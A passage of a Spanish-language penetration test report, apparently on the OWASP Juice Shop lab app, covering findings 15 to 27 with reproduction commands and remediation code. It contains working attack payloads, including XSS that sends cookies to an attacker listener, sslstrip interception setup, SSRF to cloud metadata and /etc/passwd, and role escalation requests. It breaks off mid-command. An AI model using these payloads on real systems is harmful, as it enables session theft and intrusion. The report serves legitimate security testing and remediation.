const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 5, // 5 intentos por IP
  message: 'Demasiados intentos de login',
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulAttempts: true
});

app.use('/rest/user/login', loginLimiter);
```

**Referencias:**
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Lock_Out_Mechanism

---

#### HALLAZGO #15 - Exposicion de Informacion en Encabezados HTTP

```
Identificador:         JS-015
Titulo:                Encabezados de Seguridad Faltantes
Severidad:             Medio
CVSS v3.1 Score:       5.3 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
OWASP Category:        A05:2021 - Security Misconfiguration
CWE:                   CWE-200
```

**Descripcion:**
La aplicacion no implementa encabezados de seguridad HTTP recomendados, exponiendo informacion sensible sobre el servidor y vulnerabilidades a ataques.

**Pasos de Reproduccion:**
```bash
# 1. Verificar encabezados de seguridad
curl -I http://192.168.56.101:3000

# Encabezados esperados pero ausentes:
# X-Frame-Options
# X-Content-Type-Options
# Strict-Transport-Security
# Content-Security-Policy
# X-XSS-Protection

# 2. Usar securityheaders.com para escaneo
# o nikto
nikto -h http://192.168.56.101:3000

# 3. Usar whatweb
whatweb -v http://192.168.56.101:3000

# 4. Verificar informacion expuesta en headers
curl -v http://192.168.56.101:3000 2>&1 | grep -i server
# Server: Express
# X-Powered-By: Express

# 5. Verificar si TRACE method esta habilitado
curl -X TRACE http://192.168.56.101:3000
```

**Evidencia:**
```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1234
ETag: W/"4d8-xxx"
Vary: Accept-Encoding
Date: Tue, 24 Mar 2026 10:00:00 GMT
Connection: keep-alive

# FALTANTES:
# - X-Frame-Options: DENY
# - X-Content-Type-Options: nosniff
# - Strict-Transport-Security: max-age=31536000
# - Content-Security-Policy: default-src 'self'
# - X-XSS-Protection: 1; mode=block
```

**Impacto:**
- Informacion de tecnologia expuesta facilita ataques dirigidos
- Vulnerabilidad a Clickjacking
- Vulnerabilidad a MIME sniffing
- Ausencia de HSTS permite ataques MITM

**Remediacion:**
```javascript
// Agregar encabezados de seguridad en Express
const helmet = require('helmet');
app.use(helmet());

// O configuracion manual:
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  res.setHeader('X-XSS-Protection', '1; mode=block');
  next();
});
```

**Referencias:**
- https://owasp.org/www-project-secure-headers/

---

#### HALLAZGO #16 - Vulnerabilidad de DoS en Funcion de Busqueda

```
Identificador:         JS-016
Titulo:                Denial of Service via Proceso Intensivo de Busqueda
Severidad:             Medio
CVSS v3.1 Score:       6.5 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
OWASP Category:        A05:2021 - Security Misconfiguration
CWE:                   CWE-400
```

**Descripcion:**
La funcion de busqueda no tiene limites en el procesamiento, permitiendo enviar consultas que consumen excesiva memoria y CPU.

**Pasos de Reproduccion:**
```bash
# 1. Enviar consulta masiva
for i in {1..100}; do
  curl "http://192.168.56.101:3000/rest/products/search?q=test" &
done

# 2. Enviar patron regex costoso
curl "http://192.168.56.101:3000/rest/products/search?q=.*.*.*.*.*"

# 3. Enviar caracteres de repeticion
curl "http://192.168.56.101:3000/rest/products/search?q=aaaaaaaaaaaaaaaaaaaaaaaa"

# 4. Verificar tiempo de respuesta
time curl "http://192.168.56.101:3000/rest/products/search?q=test"

# 5. Comparar con query normal
# Normal: ~50ms
# Con payload: ~5000ms (100x mas lento)

# 6. Monitorear recursos del servidor
# Mient rastascargas requests, CPU sube al 100%
```

**Evidencia:**
```bash
# Sin ataque:
$ time curl -s http://192.168.56.101:3000/rest/products/search?q=test
real    0m0.052s

# Con ataque (100 requests simultaneos):
# Todos los requests tardan mas de 5 segundos
#部分 requests timeout

# Monitoreo:
# CPU: 100%
# Memory: increasing
```

**Impacto:**
- Denegacion de servicio para usuarios legitimos
- Agotamiento de recursos del servidor
- Potencial caida completa de la aplicacion

**Remediacion:**
```javascript
// Implementar limitacion y timeout
const timeout = require('connect-timeout');

app.use('/rest/products/search', timeout('3s'));

app.use((req, res, next) => {
  if (!req.timedout) next();
});

// Limitar tamano de query
const MAX_QUERY_LENGTH = 100;
if (req.query.q && req.query.q.length > MAX_QUERY_LENGTH) {
  return res.status(400).send('Query too long');
}
```

**Referencias:**
- https://owasp.org/www-community/attacks/Denial_of_Service

---

#### HALLAZGO #17 - Domp suplantacion de Identidad (DOM-based XSS)

```
Identificador:         JS-017
Titulo:                DOM-based XSS en Procesamiento de Hash URL
Severidad:             Alto
CVSS v3.1 Score:       7.1 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
OWASP Category:        A03:2021 - Injection
CWE:                   CWE-79
```

**Descripcion:**
El codigo JavaScript del lado del cliente procesa y refleja datos del hash de la URL sin sanitizacion, permitiendo ejecucion de scripts.

**Pasos de Reproduccion:**
```bash
# 1. Identificar el uso de window.location.hash
# Navegar por la aplicacion y observar URLs con hash
# Ejemplo: http://192.168.56.101:3000/#/search?q=<script>

# 2. Probar XSS via hash
curl "http://192.168.56.101:3000/#/search?q=<script>alert('XSS')</script>"

# 3. En navegador (necesario para DOM XSS):
# Abrir DevTools > Console
# Ejecutar: location.hash = '<img src=x onerror=alert(document.domain)>'

# 4. Probar payload que robe datos
location.hash = '<script>fetch("http://192.168.56.101:8080/steal?data="+btoa(document.cookie))</script>'

# 5. Usar Burp Suite para ver como el frontend procesa el hash
# Interceptar respuesta y buscar manipulacion de DOM
```

**Evidencia:**
```javascript
// Codigo vulnerable (simplificado):
function processSearch() {
  const params = new URLSearchParams(window.location.hash.split('?')[1]);
  const query = params.get('q');
  document.getElementById('results').innerHTML = 
    '<p>Resultados para: ' + query + '</p>';
  // ^ Sin sanitizacion
}
```

**Impacto:**
- Ejecucion de JavaScript arbitrario en navegador de victima
- Robo de sesiones y cookies
- Redireccion a sitios maliciosos
- Keylogging

**Remediacion:**
```javascript
// Sanitizar salida en JavaScript
function processSearch() {
  const params = new URLSearchParams(window.location.hash.split('?')[1]);
  const query = params.get('q');
  
  // Usar textContent en lugar de innerHTML
  const resultsDiv = document.getElementById('results');
  resultsDiv.textContent = 'Resultados para: ' + query;
  
  // O usar DOMPurify
  resultsDiv.innerHTML = DOMPurify.sanitize(
    '<p>Resultados para: ' + query + '</p>'
  );
}
```

**Referencias:**
- https://owasp.org/www-community/attacks/DOM_Based_XSS

---

#### HALLAZGO #18 - Ausencia de Cifrado en Transito (HTTP)

```
Identificador:         JS-018
Titulo:                Transmision de Datos Sensibles por HTTP Sin Cifrar
Severidad:             Alto
CVSS v3.1 Score:       7.4 (Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)
OWASP Category:        A02:2021 - Cryptographic Failures
CWE:                   CWE-319
```

**Descripcion:**
La aplicacion transmite credenciales y datos sensibles sobre HTTP sin cifrado, permitiendo interceptacion en redes no confiables.

**Pasos de Reproduccion:**
```bash
# 1. Capturar trafico con Wireshark
# Ejecutar login y observar trafico

# 2. Usar sslstrip (si el servidor soporta HTTP)
# En Kali:
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
sslstrip -l 8080

# 3. Interceptar con Burp Proxy
# Configurar navegador para usar Burp
# Capturar request de login

# 4. Verificar que la contrasena se envia en texto claro
curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}'
# Capturar con tcpdump
tcpdump -i eth0 -A port 3000

# 5. Intentar HTTPS y verificar certificacion
curl -k https://192.168.56.101:3000  # -k ignora cert invalido
```

**Evidencia:**
```bash
# tcpdump mostrando password en texto claro:
POST /rest/user/login HTTP/1.1
Host: 192.168.56.101:3000
Content-Type: application/json
Content-Length: 67

{"email":"admin@juice-sh.op","password":"admin123"}
#                                                              ^^^^^^^^^^^^^^^^
# Password visible en texto claro
```

**Impacto:**
- Interceptacion de credenciales por MITM
- Robo de sesiones
- Compromiso completo de cuentas
- Violacion de regulaciones de seguridad (PCI-DSS, HIPAA, GDPR)

**Remediacion:**
```nginx
# Configurar HTTPS en servidor
server {
    listen 443 ssl http2;
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    
    add_header Strict-Transport-Security "max-age=31536000" always;
}
```

**Referencias:**
- https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html

---

#### HALLAZGO #19 - Vulnerabilidad de Unicode en Normalizacion

```
Identificador:         JS-019
Titulo:                Homoglyph Attack en Autenticacion
Severidad:             Medio
CVSS v3.1 Score:       5.3 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)
OWASP Category:        A07:2021 - Identification and Authentication Failures
CWE:                   CWE-178
```

**Descripcion:**
La aplicacion no normaliza caracteres Unicode de manera adecuada, permitiendo registros de usuarios con caracteres visualmente identicos pero diferentes en codigo (homoglyphs).

**Pasos de Reproduccion:**
```bash
# 1. Registrar usuario con homoglyph del admin
# Cyrillic 'а' (U+0430) vs Latin 'a' (U+0061)

# Intentar registrar: admin@juice-sh.op usando homoglyphs
curl -X POST http://192.168.56.101:3000/rest/user/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "аdmin@juice-sh.op",
    "password": "hacked123",
    "passwordRepeat": "hacked123"
  }'

# 2. Usar caracteres unicode similares
# 'ο' (Greek omicron) vs 'o' (Latin o)
# 'е' (Cyrillic) vs 'e' (Latin)

# 3. Verificar si se permite registro
# Resposta exitosa indica vulnerabilidad

# 4. Intentar login con el usuario registrado
curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"аdmin@juice-sh.op","password":"hacked123"}'

# 5. Comparar visualmente
# admin@juice-sh.op vs аdmin@juice-sh.op
# Son visualmente identicos pero diferentes internamente
```

**Evidencia:**
```bash
# Registro exitoso con homoglyph:
$ curl -X POST http://192.168.56.101:3000/rest/user/register \
  -d '{"email":"аdmin@juice-sh.op","password":"hacker123"}'

{"success":true,"userId":42}

# Ahora existe userId=1 (admin) y userId=42 (аdmin)
# Si el sistema permite, pueden confundirse
```

**Impacto:**
- Suplantacion de identidad de otros usuarios
- Confusion en logs y auditorias
- Potencial bypass de controles de acceso
- Dificultad para rastrear actividad maliciosa

**Remediacion:**
```javascript
// Normalizar y validar unicode
const unicodify = require('unicodify');

function normalizeEmail(email) {
  // Convertir a forma normalizada (NFKC)
  const normalized = email.normalize('NFKC');
  // Rechazar homoglyphs mezclados
  const latinOnly = normalized.replace(/[^\x00-\x7F]/g, '');
  if (normalized !== latinOnly) {
    throw new Error('Email contains non-Latin characters');
  }
  return normalized.toLowerCase();
}
```

**Referencias:**
- https://unicode.org/notes/tn39/tr39-23d1.html

---

#### HALLAZGO #20 - Log Poisoning via Injection de Logs

```
Identificador:         JS-020
Titulo:                Inyeccion de Comandos via Log Poisoning
Severidad:             Medio
CVSS v3.1 Score:       6.1 (Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N)
OWASP Category:        A03:2021 - Injection
CWE:                   CWE-117
```

**Descripcion:**
La aplicacion registra entrada de usuario sin sanitizacion en archivos de log, permitiendo pollution de logs que puede explotarse en escenarios de log parsing.

**Pasos de Reproduccion:**
```bash
# 1. Inyectar caracteres de nueva linea en input
curl "http://192.168.56.101:3000/rest/products/search?q=test%0aInjected:Log"

# 2. Intentar CRLF injection
curl -H "X-Forwarded-For: 192.168.56.101%0d%0aX-Injected:Header" \
  http://192.168.56.101:3000/

# 3. Probar en campos de registro
curl -X POST http://192.168.56.101:3000/rest/user/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com%0aInjected:Log","password":"test"}'

# 4. Verificar logs del servidor
# Si los logs muestran:
# [INFO] User registered: test@test.com
# Injected: Log
# Es vulnerable

# 5. Intentar inyeccion de format string (si logs usan format)
curl "http://192.168.56.101:3000/rest/products/search?q=%s%s%s%s"
```

**Evidencia:**
```bash
# Contenido de logs/juice-shop.log:
[2026-03-24 10:00:00] INFO  User registered: test@test.com
Injected: Log
[2026-03-24 10:00:01] ERROR Invalid input: %s%s%s
```

**Impacto:**
- Pollution de logs para ocultar actividad maliciosa
- Confusion en sistemas de monitoreo
- Potencial explotacion si logs se procesan con parsers debiles
- Injection en sistemas SIEM

**Remediacion:**
```javascript
// Sanitizar entrada antes de loggear
function sanitizeForLog(input) {
  return String(input)
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/%0[da]/gi, '\\n');
}

logger.info(`User search: ${sanitizeForLog(req.query.q)}`);
```

**Referencias:**
- https://owasp.org/www-community/attacks/Log_Injection

---

#### HALLAZGO #21 - IDOR enAPI deComentarios de Productos

```
Identificador:         JS-021
Titulo:                IDOR en API de Resenas de Productos
Severidad:             Alto
CVSS v3.1 Score:       7.1 (Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L)
OWASP Category:        A01:2021 - Broken Access Control
CWE:                   CWE-639
```

**Descripcion:**
La aplicacion permite acceder y modificar recursos de otros usuarios mediante manipulacion de parametros de ID, sin verificar propiedad del recurso.

**Pasos de Reproduccion:**
```bash
# 1. Obtener una resena propia
curl -H "Authorization: Bearer <token_usuario>" \
  http://192.168.56.101:3000/rest/products/1/reviews

# Identificar el ID de una resena: reviewId: 5

# 2. Intentar acceder a resena de OTRO usuario
curl -H "Authorization: Bearer <token_usuario>" \
  http://192.168.56.101:3000/api/Products/1/reviews/5

# Si retorna datos, es vulnerable

# 3. Modificar resena de otro usuario
curl -X PUT -H "Authorization: Bearer <token_usuario>" \
  -H "Content-Type: application/json" \
  -d '{"message":"Mensaje modificado por atacante"}' \
  http://192.168.56.101:3000/api/Products/1/reviews/5

# 4. Eliminar resena de otro usuario
curl -X DELETE -H "Authorization: Bearer <token_usuario>" \
  http://192.168.56.101:3000/api/Products/1/reviews/5

# 5. Probar con diferentes IDs
for id in {1..20}; do
  curl -s -H "Authorization: Bearer <token>" \
    http://192.168.56.101:3000/api/Products/1/reviews/$id
done
```

**Evidencia:**
```json
// Respuesta al acceder a resena de otro usuario:
{
  "id": 5,
  "productId": 1,
  "author": "victim@email.com",
  "message": "Original message from victim",
  "rating": 5
}
```

**Impacto:**
- Acceso no autorizado a informacion sensible
- Modificacion de contenido de otros usuarios
- Eliminacion de datos de otros usuarios
- Escalada de privilegios

**Remediacion:**
```javascript
// Verificar propiedad del recurso
app.put('/api/products/:productId/reviews/:reviewId', 
  authenticate,
  async (req, res) => {
    const review = await Review.findById(req.params.reviewId);
    
    if (review.authorId !== req.user.id && req.user.role !== 'admin') {
      return res.status(403).send('Access denied');
    }
    
    review.message = req.body.message;
    await review.save();
    res.send(review);
  }
);
```

**Referencias:**
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Weak_Account_Unlock_Mechanism

---

#### HALLAZGO #22 - Stored XSS en Campo de Direccion

```
Identificador:         JS-022
Titulo:                Cross-Site Scripting Almacenado en Perfil de Usuario
Severidad:             Alto
CVSS v3.1 Score:       8.1 (Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N)
OWASP Category:        A03:2021 - Injection
CWE:                   CWE-79
```

**Descripcion:**
El campo de direccion en el perfil de usuario almacena codigo JavaScript malicioso sin sanitizacion, ejecutandose cada vez que un admin visualiza la direccion.

**Pasos de Reproduccion:**
```bash
# 1. Actualizar perfil con XSS en campo de direccion
curl -X PUT -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "address": "123 Main St<img src=x onerror=fetch(\"http://192.168.56.101:8080/\"+document.cookie)>"
  }' \
  http://192.168.56.101:3000/rest/user/address

# 2. Probar diferentes campos
curl -X PUT -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"fullName":"<script>alert(1)</script>"}' \
  http://192.168.56.101:3000/rest/user/profile

# 3. Verificar que el XSS se almacena
curl -H "Authorization: Bearer <token>" \
  http://192.168.56.101:3000/rest/user/address

# 4. Probar con payload que roba token de admin
# Cuando admin visualiza la orden/direccion:
# El script malicioso se ejecuta
# Env�a cookie/token a servidor del atacante
```

**Evidencia:**
```json
// Datos almacenados sin sanitizacion:
{
  "address": "123 Main St<img src=x onerror=fetch('http://192.168.56.101:8080/'+document.cookie)>"
}

// Cuando admin visualiza en panel:
HTML: <p>Direccion: 123 Main St<img src=x onerror=fetch('http://192.168.56.101:8080/'+document.cookie)></p>
```

**Impacto:**
- Robo de sesiones de administradores
- Defacement del panel de administracion
- Keylogging
- Exfiltracion de datos sensibles

**Remediacion:**
```javascript
// Sanitizar todo input en el backend
const DOMPurify = require('isomorphic-dompurify');

function sanitizeAddress(address) {
  return DOMPurify.sanitize(address, {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: []
  });
}

user.address = sanitizeAddress(req.body.address);
```

**Referencias:**
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

#### HALLAZGO #23 - Vulnerabilidad en Proceso de Compra (Price Manipulation)

```
Identificador:         JS-023
Titulo:                Manipulacion de Precio en Carrito de Compras
Severidad:             Critico
CVSS v3.1 Score:       8.1 (Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
OWASP Category:        A08:2021 - Software and Data Integrity Failures
CWE:                   CWE-345
```

**Descripcion:**
El precio del producto se acepta desde el cliente sin validacion en el servidor, permitiendo a un atacante modificar el precio antes de la compra.

**Pasos de Reproduccion:**
```bash
# 1. Agregar producto al carrito normalmente
curl -X POST -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"ProductId":1,"quantity":1}' \
  http://192.168.56.101:3000/api/BasketItems/

# 2. Interceptar peticion de checkout
# Modificar el precio antes de enviar
curl -X POST -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "items": [{"ProductId":1,"quantity":1,"price":0.01}],
    "coupon": "invalid",
    "total": 0.01
  }' \
  http://192.168.56.101:3000/api/checkout

# 3. Tambien probar manipulacion de precio por item
curl -X PUT -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"price":0.01}' \
  http://192.168.56.101:3000/api/BasketItems/1

# 4. Verificar si se aplica el precio manipulado
curl -H "Authorization: Bearer <token>" \
  http://192.168.56.101:3000/api/BasketItems/

# 5. Intentar con cupones de descuento invalidos
curl -X POST -H "Authorization: Bearer <token>" \
  -d '{"coupon":"'$(printf 'A%.0s' {1..100})'"}' \
  http://192.168.56.101:3000/api/redeem
```

**Evidencia:**
```bash
# Peticion interceptada:
POST /api/checkout
{
  "total": 0.01,   # Cambiado de 99.99 a 0.01
  "coupon": ""
}

# Respuesta exitosa:
{
  "orderId": 12345,
  "total": 0.01,  # Precio manipulado aceptado
  "status": "confirmed"
}
```

**Impacto:**
- Fraude financiero directo
- Perdida economica para la empresa
- Compras de productos costosos por minimo precio
- Abuso de descuentos

**Remediacion:**
```javascript
// VALIDAR SIEMPRE EN EL SERVIDOR
app.post('/api/checkout', authenticate, async (req, res) => {
  const userId = req.user.id;
  const basket = await Basket.find({ userId }).populate('items');
  
  // Calcular precio REAL desde la base de datos
  let total = 0;
  for (const item of basket.items) {
    const product = await Product.findById(item.productId);
    total += product.price * item.quantity;  // Usar precio del servidor
  }
  
  if (req.body.total !== total) {
    return res.status(400).send('Price mismatch detected');
  }
  
  // Procesar pago con precio validado
});
```

**Referencias:**
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_for_Manipulation_of_Business_Data

---

#### HALLAZGO #24 - Enumeracion de Usuarios via Respuestas Diferenciales

```
Identificador:         JS-024
Titulo:                Enumeracion de Usuarios Validos via Login
Severidad:             Bajo
CVSS v3.1 Score:       4.3 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
OWASP Category:        A07:2021 - Identification and Authentication Failures
CWE:                   CWE-204
```

**Descripcion:**
El sistema proporciona respuestas diferentes para usuarios validos vs invalidos, permitiendo a un atacante enumerar cuentas existentes.

**Pasos de Reproduccion:**
```bash
# 1. Probar email valido con password invalida
curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"wrong"}'
# Respuesta: "Invalid email or password"

# 2. Probar email invalido con password cualquiera
curl -X POST http://192.168.56:101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent@email.com","password":"wrong"}'
# Comparar respuestas

# 3. Script para enumerar usuarios
cat > enum_users.sh << 'EOF'
#!/bin/bash
emails=("admin@juice-sh.op" "user@juice-sh.op" "test@test.com" 
        "jim@juice-sh.op" "bender@juice-sh.op" "accounts@juice-sh.op")

for email in "${emails[@]}"; do
  resp=$(curl -s -X POST http://192.168.56.101:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"test123\"}")
  
  if echo "$resp" | grep -q "Invalid"; then
    # Verificar si es password invalida vs email invalido
    # Mirar el timing de respuesta o mensajes de error detallados
    echo "[?] $email - Posiblemente valido"
  else
    echo "[-] $email - Usuario no existe"
  fi
done
EOF

bash enum_users.sh

# 4. Verificar en registro
curl -X POST http://192.168.56.101:3000/rest/user/register \
  -d '{"email":"admin@juice-sh.op","password":"test"}'
# Si dice "Email already exists" -> Enumeracion exitosa
```

**Evidencia:**
```bash
# Email no existe:
{"status":"error","message":"User not found"}

# Email existe:
{"status":"error","message":"Password mismatch"}

# Mensajes sutilmente diferentes
# O diferentes tiempos de respuesta
```

**Impacto:**
- Enumeracion de usuarios validos
- Facilita ataques de fuerza bruta dirigida
- Información para ingenieria social

**Remediacion:**
```javascript
// Usar mensajes identicos para todos los errores
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Usar tiempo constante para prevenir timing attacks
  const timingSafeCompare = require('crypto').timingSafeEqual;
  
  const user = await User.findOne({ email });
  
  // Siempre ejecutar verifyPassword aunque usuario no exista
  // Para prevenir timing attacks
  const fakeHash = '$2b$12$qXJ3vC5mH8xF2yR4pL9nZeO3qX5vC7nH2sD1fG4iJ6kL8mN0oP1qR';
  
  await bcrypt.compare(password, user ? user.passwordHash : fakeHash);
  
  // Siempre dar el mismo mensaje de error
  res.status(401).json({ message: 'Invalid credentials' });
});
```

**Referencias:**
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Default_Credentials

---

#### HALLAZGO #25 - Vulnerabilidad de Mass Assignment

```
Identificador:         JS-025
Titulo:                Asignacion Masiva en Perfil de Usuario
Severidad:             Medio
CVSS v3.1 Score:       6.5 (Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)
OWASP Category:        A01:2021 - Broken Access Control
CWE:                   CWE-915
```

**Descripcion:**
El API acepta parametros adicionales que no deberian ser modificables por el usuario, como el rol, permitiendo escalation de privilegios.

**Pasos de Reproduccion:**
```bash
# 1. Intentar cambiar rol en actualizacion de perfil
curl -X PUT -H "Authorization: Bearer <token_usuario>" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user@juice-sh.op",
    "role": "admin"
  }' \
  http://192.168.56.101:3000/rest/user/profile

# 2. Agregar campos adicionales no visibles en el formulario
curl -X PUT -H "Authorization: Bearer <token_usuario>" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user@juice-sh.op",
    "role": "admin",
    "isAdmin": true,
    "permissions": ["read", "write", "delete"]
  }' \
  http://192.168.56.101:3000/rest/user/profile

# 3. Intentar agregarcredit card
curl -X PUT -H "Authorization: Bearer <token_usuario>" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user@juice-sh.op",
    "creditCard": "4111111111111111"
  }' \
  http://192.168.56.101:3000/rest/user/profile

# 4. Verificar si se aplicaron los cambios
curl -H "Authorization: Bearer <token_usuario>" \
  http://192.168.56.101:3000/rest/user/whoami

# 5. Probar con diferentes campos
curl -X PUT -H "Authorization: Bearer <token>" \
  -d '{"password":"newpassword","totpSecret":"JBSWY3DPEHPK3PXP"}' \
  http://192.168.56.101:3000/rest/user/profile
```

**Evidencia:**
```json
// Request:
{
  "email": "user@juice-sh.op",
  "role": "admin"
}

// Respuesta:
{
  "success": true,
  "user": {
    "email": "user@juice-sh.op",
    "role": "admin",  // <-- Rol cambiado!
    "previousRole": "customer"
  }
}
```

**Impacto:**
- Escalada de privilegios
- Cambio de rol a administrador
- Acceso no autorizado a funciones protegidas
- Modificacion de datos financieros

**Remediacion:**
```javascript
//whitelist de campos permitidos
const allowedFields = ['email', 'fullName', 'address'];

app.put('/rest/user/profile', authenticate, async (req, res) => {
  const updates = {};
  
  // Solo copiar campos permitidos
  for (const field of allowedFields) {
    if (req.body[field] !== undefined) {
      updates[field] = req.body[field];
    }
  }
  
  await User.findByIdAndUpdate(req.user.id, updates);
  res.send({ success: true });
});
```

**Referencias:**
- https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html

---

#### HALLAZGO #26 - SSRF (Server-Side Request Forgery)

```
Identificador:         JS-026
Titulo:                SSRF en Funcionalidad de Exportacion de Datos
Severidad:             Alto
CVSS v3.1 Score:       8.6 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
OWASP Category:        A10:2021 - Server-Side Request Forgery (SSRF)
CWE:                   CWE-918
```

**Descripcion:**
La aplicacion realiza peticiones HTTP a URLs controladas por el usuario sin validacion, permitiendo acceso a recursos internos.

**Pasos de Reproduccion:**
```bash
# 1. Identificar parametros que aceptan URLs
# comunmente: url, src, dest, redirect, uri, path, continue, url, window, next, data, reference, site, html, val, validate, domain, callback, return, page, feed, host, port, to, out, view, dir, show, navigation, open, file, document, folder, pg, style, doc, img, type, go, search, val, name, form, bean, load, script, url, embed, source, code, action, operation

# 2. Probar acceso a localhost
curl -X POST -H "Authorization: Bearer <token>" \
  -d '{"url":"http://localhost:3000/admin"}' \
  http://192.168.56.101:3000/api/data-export

# 3. Probar acceso a servicios internos
curl -X POST -H "Authorization: Bearer <token>" \
  -d '{"url":"http://127.0.0.1:6379/INFO"}' \
  http://192.168.56.101:3000/api/data-export

# 4. Probar acceso a Metadata de cloud
# AWS:
curl -X POST -H "Authorization: Bearer <token>" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  http://192.168.56.101:3000/api/data-export

# 5. Probar para leer archivos locales (file://)
curl -X POST -H "Authorization: Bearer <token>" \
  -d '{"url":"file:///etc/passwd"}' \
  http://192.168.56.101:3000/api/data-export

# 6. Probar escaneo de puertos internos
for port in 22 80 443 3306 5432 6379; do
  echo "Testing port $port..."
  curl -s -m 2 -X POST -H "Authorization: Bearer <token>" \
    -d "{\"url\":\"http://127.0.0.1:$port\"}" \
    http://192.168.56.101:3000/api/data-export | head -c 100
done
```

**Evidencia:**
```json
// Respuesta al acceder a metadata de AWS:
{
  "success": true,
  "data": "ami-id: ami-0123456789abcdef0\ninstance-type: t2.micro\n..."
}
```

**Impacto:**
- Acceso a servicios internos
- Lectura de metadatos cloud
- Escaneo de puertos internos
- Potencial RCE si se encuentra servicio vulnerable

**Remediacion:**
```javascript
// Validar y sanitizar URLs
const { URL } = require('url');

function validateUrl(inputUrl) {
  try {
    const parsed = new URL(inputUrl);
    
    // Solo permitir protocolos seguros
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      throw new Error('Invalid protocol');
    }
    
    // Bloquear localhost y privados en produccion
    const hostname = parsed.hostname.toLowerCase();
    if (hostname === 'localhost' || 
        hostname === '127.0.0.1' ||
        hostname.startsWith('192.168.') ||
        hostname.startsWith('10.') ||
        hostname.startsWith('172.')) {
      throw new Error('Access to internal hosts not allowed');
    }
    
    return parsed.href;
  } catch {
    throw new Error('Invalid URL');
  }
}
```

**Referencias:**
- https://owasp.org/www-community/attacks/Server_Side_Request_Forgery

---

#### HALLAZGO #27 - Inyeccion de Headers HTTP (HTTP Response Splitting)

```
Identificador:         JS-027
Titulo:                CRLF Injection en Encabezados de Respuesta
Severidad:             Medio
CVSS v3.1 Score:       6.5 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
OWASP Category:        A03:2021 - Injection
CWE:                   CWE-93
```

**Descripcion:**
La aplicacion permite injection de caracteres de control en headers HTTP, permitiendo manipulacion de respuestas.

**Pasos de Reproduccion:**
```bash
# 1. Identificar parametros reflejados en headers
curl -I "http://192.168.56.101:3000/rest/products/search?q=test"

# 2. Probar CRLF injection en parametros
curl -H "X-Forwarded-For: test%0d%0aSet-Cookie:%20evil=test" \
  http://192.168.56.101:3000/

# 3. Probar en redirect
curl -L "http://192.168.56.101:3000/redirect?url=http://google.com%0d%0aX-Injected:%20header"

# 4. Intentar inyeccion completa de respuesta
curl -H "Location: http://evil.com%0d%0aContent-Length:%2020%0d%0a%0d%0a<html>hacked</html>" \
